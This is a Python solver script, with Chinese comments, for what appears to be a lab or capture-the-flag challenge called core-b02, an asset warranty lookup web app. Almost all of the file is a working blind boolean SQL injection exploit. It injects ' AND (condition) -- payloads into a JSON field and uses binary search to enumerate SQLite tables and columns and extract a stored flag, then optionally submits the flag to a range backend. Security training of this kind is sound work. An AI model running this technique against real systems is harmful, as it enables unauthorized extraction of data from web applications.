#!/usr/bin/env python3
"""
core-b02「资产保修核验平台」解题脚本

用法：
    python solve_core_b02.py --url http://192.168.236.1:28734

如果需要自动向靶场后端提交 flag：
    python solve_core_b02.py \
        --url http://192.168.236.1:28734 \
        --control-url http://127.0.0.1:18081 \
        --instance-id <实例ID>

注意：--url 必须使用实例页面显示的 target_url。
当前 Windows VMnet 转发配置通常是内部端口 + 10000，例如：
    内部 18734 -> 外部 28734
不要直接把内部 Docker 端口当作 Kali 访问端口。
"""

from __future__ import annotations

import argparse
import html
import re
import sys
import time
from typing import Any

import requests


DEFAULT_ASSET = "PC-2026-013"
DEFAULT_DEPARTMENT = "OPS"
DEFAULT_INVALID_ASSET = "PC-0000-000"
DEFAULT_INVALID_DEPARTMENT = "NONE"


def sql_literal(value: str) -> str:
    """将字符串安全地包装成 SQLite 字符串字面量。"""
    return "'" + value.replace("'", "''") + "'"


def sql_identifier(value: str) -> str:
    """只允许合法 SQLite 标识符，避免把推导出的名称直接拼接造成二次问题。"""
    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", value):
        raise ValueError(f"非法数据库标识符: {value!r}")
    return '"' + value.replace('"', '""') + '"'


class WarrantySolver:
    def __init__(
        self,
        target_url: str,
        timeout: float = 10.0,
        delay: float = 0.0,
        verbose: bool = False,
    ) -> None:
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        self.client = requests.Session()
        self.client.headers.update({"User-Agent": "core-b02-solver/1.0"})
        self.requests_seen = 0

    def _request_json(self, method: str, url: str, **kwargs: Any) -> dict[str, Any]:
        """发请求并给出可读的错误，而不是直接抛 JSONDecodeError。"""
        try:
            response = self.client.request(method, url, timeout=self.timeout, **kwargs)
        except requests.RequestException as exc:
            raise RuntimeError(
                f"无法连接目标: {url}\n"
                f"{exc}\n\n"
                "请确认：目标容器正在运行、使用的是 target_url、"
                "以及 VMnet 转发脚本已经重新启动。"
            ) from exc

        content_type = response.headers.get("content-type", "")
        body_preview = response.text[:500].replace("\r", " ").replace("\n", " ")
        if self.verbose:
            print(f"[HTTP] {response.status_code} {content_type} {url}")

        if response.status_code != 200:
            raise RuntimeError(
                f"目标返回 HTTP {response.status_code}: {url}\n"
                f"响应类型: {content_type or '(未提供)'}\n"
                f"响应内容: {body_preview}"
            )

        try:
            data = response.json()
        except requests.exceptions.JSONDecodeError as exc:
            raise RuntimeError(
                f"目标没有返回 JSON: {url}\n"
                f"响应类型: {content_type or '(未提供)'}\n"
                f"响应内容: {body_preview}\n\n"
                "如果这里是 HTML 页面或网关错误页，说明端口/转发地址不对；"
                "先访问 <target_url>/health 检查。"
            ) from exc

        if not isinstance(data, dict):
            raise RuntimeError(f"目标返回的 JSON 不是对象: {data!r}")
        return data

    def inspect_target(self) -> tuple[str, str, str, str, str]:
        """从首页提取实际接口、字段名和两组样例。"""
        response = self.client.get(self.target_url + "/", timeout=self.timeout)
        if response.status_code != 200:
            raise RuntimeError(
                f"首页返回 HTTP {response.status_code}: {response.url}\n"
                f"{response.text[:500]}"
            )

        page = response.text
        endpoint_match = re.search(
            r"QUERY_ENDPOINT\s*=\s*['\"]([^'\"]+)", page
        )
        fields_match = re.search(
            r"FIELD_NAMES\s*=\s*\[['\"]([^'\"]+)['\"],\s*['\"]([^'\"]+)['\"]\]",
            page,
        )
        examples = re.findall(
            r"data-asset-no=['\"]([^'\"]+)['\"]\s+"
            r"data-department=['\"]([^'\"]+)",
            page,
        )

        # 当前题目首页有这些标记；如果页面被定制过，使用题目的默认值继续执行。
        endpoint = endpoint_match.group(1) if endpoint_match else "/api/warranty/check"
        field_a, field_b = fields_match.groups() if fields_match else ("asset_no", "department")
        valid_asset, valid_department = examples[0] if len(examples) >= 1 else (
            DEFAULT_ASSET,
            DEFAULT_DEPARTMENT,
        )
        invalid_asset, invalid_department = examples[1] if len(examples) >= 2 else (
            DEFAULT_INVALID_ASSET,
            DEFAULT_INVALID_DEPARTMENT,
        )

        print(f"[+] 接口: {endpoint}")
        print(f"[+] 字段: {field_a}, {field_b}")
        print(f"[+] 有效样例: {valid_asset} / {valid_department}")
        print(f"[+] 无效样例: {invalid_asset} / {invalid_department}")
        return (
            endpoint,
            field_a,
            field_b,
            valid_asset + "\x00" + invalid_asset,
            valid_department + "\x00" + invalid_department,
        )

    def run(self) -> str:
        endpoint, field_a, field_b, assets, departments = self.inspect_target()
        valid_asset, invalid_asset = assets.split("\x00", 1)
        valid_department, invalid_department = departments.split("\x00", 1)
        query_url = self.target_url + endpoint

        def query(payload: dict[str, str]) -> bool:
            self.requests_seen += 1
            if self.delay > 0:
                time.sleep(self.delay)
            data = self._request_json("POST", query_url, json=payload)
            if "matched" not in data:
                raise RuntimeError(f"JSON 中没有 matched 字段: {data!r}")
            matched = bool(data["matched"])
            if self.verbose:
                print(f"[QUERY {self.requests_seen}] matched={matched} payload={payload}")
            return matched

        print("[*] 检查基线...")
        if not query({field_a: valid_asset, field_b: valid_department}):
            raise RuntimeError("有效样例没有返回 matched=true，当前实例或目标地址不正确。")
        if query({field_a: invalid_asset, field_b: invalid_department}):
            raise RuntimeError("无效样例返回了 matched=true，当前实例状态异常。")

        base = {field_a: valid_asset, field_b: valid_department}
        vulnerable_field: str | None = None
        for field in (field_a, field_b):
            false_probe = dict(base)
            false_probe[field] = str(false_probe[field]) + "' AND 1=0 -- "
            if query(false_probe) is False:
                true_probe = dict(base)
                true_probe[field] = str(true_probe[field]) + "' AND 1=1 -- "
                if query(true_probe) is True:
                    vulnerable_field = field
                    break

        if vulnerable_field is None:
            raise RuntimeError("没有发现可利用字段；当前题目版本可能已经修复或地址错误。")
        print(f"[+] 可注入字段: {vulnerable_field}")

        def boolean(condition: str) -> bool:
            payload = {field_a: valid_asset, field_b: valid_department}
            payload[vulnerable_field] = (
                str(payload[vulnerable_field]) + f"' AND ({condition}) -- "
            )
            return query(payload)

        def infer_length(expression: str, upper: int = 128) -> int:
            low, high = 0, upper
            while low < high:
                middle = (low + high) // 2
                if boolean(f"length(cast(({expression}) as text)) > {middle}"):
                    low = middle + 1
                else:
                    high = middle
            return low

        def infer_number(expression: str, upper: int = 32) -> int:
            low, high = 0, upper
            while low < high:
                middle = (low + high) // 2
                if boolean(f"({expression}) > {middle}"):
                    low = middle + 1
                else:
                    high = middle
            return low

        def infer_ascii(expression: str, position: int) -> str:
            low, high = 0, 127
            while low < high:
                middle = (low + high) // 2
                condition = (
                    f"unicode(substr(cast(({expression}) as text), {position}, 1)) > {middle}"
                )
                if boolean(condition):
                    low = middle + 1
                else:
                    high = middle
            return chr(low)

        def infer_text(expression: str, upper: int = 128) -> str:
            length = infer_length(expression, upper=upper)
            if length == 0:
                return ""
            return "".join(
                infer_ascii(expression, position)
                for position in range(1, length + 1)
            )

        print("[*] 枚举包含 setting 的表名...")
        table_expression = (
            "(select name from sqlite_master "
            "where type='table' and name like '%setting%' limit 1)"
        )
        settings_table = infer_text(table_expression)
        if not settings_table:
            raise RuntimeError("没有找到 service_settings 表。")
        print(f"[+] 表名: {settings_table}")

        table_literal = sql_literal(settings_table)
        column_count_expression = (
            f"(select count(*) from pragma_table_info({table_literal}))"
        )
        column_count = infer_number(column_count_expression)
        if column_count <= 0 or column_count > 32:
            raise RuntimeError(f"读取到的列数异常: {column_count}")

        columns: list[str] = []
        for offset in range(column_count):
            expression = (
                f"(select name from pragma_table_info({table_literal}) "
                f"order by cid limit 1 offset {offset})"
            )
            column = infer_text(expression)
            columns.append(column)
        print(f"[+] 列名: {', '.join(columns)}")

        value_column = next(
            (column for column in columns if "value" in column.lower()),
            None,
        )
        if value_column is None:
            raise RuntimeError("没有找到包含 value 的字段。")

        flag_expression = (
            f"(select {sql_identifier(value_column)} from {sql_identifier(settings_table)} "
            f"where cast({sql_identifier(value_column)} as text) like 'flag{{%' limit 1)"
        )
        flag_length = infer_length(flag_expression, upper=128)
        if flag_length < 7:
            raise RuntimeError(f"flag 长度异常: {flag_length}")
        print(f"[+] Flag 长度: {flag_length}")

        # 题目 flag 格式为 flag{十六进制字符}。
        alphabet = "0123456789abcdef"
        flag = "flag{"
        for position in range(6, flag_length):
            low, high = 1, len(alphabet)
            while low < high:
                middle = (low + high) // 2
                condition = (
                    f"instr({sql_literal(alphabet)}, "
                    f"substr(cast(({flag_expression}) as text), {position}, 1)) > {middle}"
                )
                if boolean(condition):
                    low = middle + 1
                else:
                    high = middle
            flag += alphabet[low - 1]
            print(f"[+] 当前 flag: {flag}...")

        flag += "}"
        if not re.fullmatch(r"flag\{[0-9a-f]+\}", flag):
            raise RuntimeError(f"恢复出的 flag 格式异常: {flag}")
        print(f"\n[SUCCESS] {flag}")
        print(f"[*] 共使用请求: {self.requests_seen}")
        return flag


def submit_flag(control_url: str, instance_id: str, flag: str, timeout: float) -> None:
    url = control_url.rstrip("/") + f"/api/v1/instances/{instance_id}/submit"
    try:
        response = requests.post(url, json={"flag": flag}, timeout=timeout)
        response.raise_for_status()
        data = response.json()
    except requests.RequestException as exc:
        raise RuntimeError(f"提交 flag 失败: {url}\n{exc}") from exc
    except requests.exceptions.JSONDecodeError as exc:
        raise RuntimeError(
            f"提交接口没有返回 JSON: HTTP {response.status_code}\n{response.text[:500]}"
        ) from exc
    print(f"[SUBMIT] {data}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="core-b02 SQLi 解题脚本")
    parser.add_argument(
        "--url",
        required=True,
        help="题目实例 target_url，例如 http://192.168.236.1:28734",
    )
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--delay", type=float, default=0.0, help="每次查询前延迟秒数")
    parser.add_argument("--verbose", action="store_true", help="显示每次 HTTP 请求")
    parser.add_argument("--control-url", help="靶场后端地址，例如 http://127.0.0.1:18081")
    parser.add_argument("--instance-id", help="实例 ID；配合 --control-url 自动提交")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if bool(args.control_url) != bool(args.instance_id):
        print("--control-url 和 --instance-id 必须同时提供", file=sys.stderr)
        return 2

    try:
        solver = WarrantySolver(
            target_url=args.url,
            timeout=args.timeout,
            delay=args.delay,
            verbose=args.verbose,
        )
        flag = solver.run()
        if args.control_url and args.instance_id:
            submit_flag(args.control_url, args.instance_id, flag, args.timeout)
        return 0
    except (RuntimeError, ValueError) as exc:
        print(f"\n[ERROR] {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
